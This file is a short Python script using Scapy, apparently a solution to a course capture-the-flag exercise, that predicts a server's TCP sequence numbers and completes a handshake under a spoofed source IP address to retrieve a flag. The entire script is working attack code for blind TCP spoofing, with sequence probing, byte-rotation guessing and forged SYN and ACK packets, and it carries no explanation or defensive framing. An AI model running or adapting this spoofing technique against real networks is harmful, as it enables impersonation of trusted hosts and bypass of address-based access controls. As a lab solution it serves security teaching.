#!/usr/bin/python3

from scapy.all import *

# dest_host = "flagserv.cse543.rev.fish"
dest_ip = "172.16.44.1"
src_ip = "10.2.4.10"
target_ip = "172.16.20.14"                                                


def rotate_left(n):
  return (n >> 24 | n << 8) & 0xffffffff

def get_bytes(n):
  results = []
  for i in range(4):
    results.append(n & 0xff)
    n >>= 8
  return results

targets = []
target_bytes = set()
new_bytes = set()
count = 0

# Get first sequences with a new byte
while count <= 1 or len(target_bytes) == len(new_bytes) :
  # Get a current sequence number from the server
  trial = IP(dst=dest_ip)/TCP(dport=13337, flags='S', seq=1)/target_ip
  trial_ack = sr1(trial, iface="tap0")

  # Test if a byte has changed
  seq = trial_ack.seq
  targets.append(hex(seq))
  target_bytes = set(new_bytes)
  new_bytes.update(get_bytes(seq))
  count += 1

target_bytes = set(new_bytes)

# Guess next permutation
seq = rotate_left(seq)

# Replay the sequence number, 1/6 probability of getting it right
for j in range(4):
  syn = IP(dst=dest_ip, src=src_ip)/TCP(dport=13337, flags='S', seq=1)/target_ip
  syn_ack = send(syn, iface="tap0")
  # print(syn_ack.seq)
  time.sleep(0.3)

  # Use the sequence number obtained using my own IP as the ack, incremented
  ack = IP(dst=dest_ip, src=src_ip)/TCP(dport=13337, flags='A', 
    seq=2, ack=seq + 1)/target_ip
  response = sr1(ack, iface="tap0", timeout=0.5)
  
  if response:
    print(response[UDP].payload)

print(targets)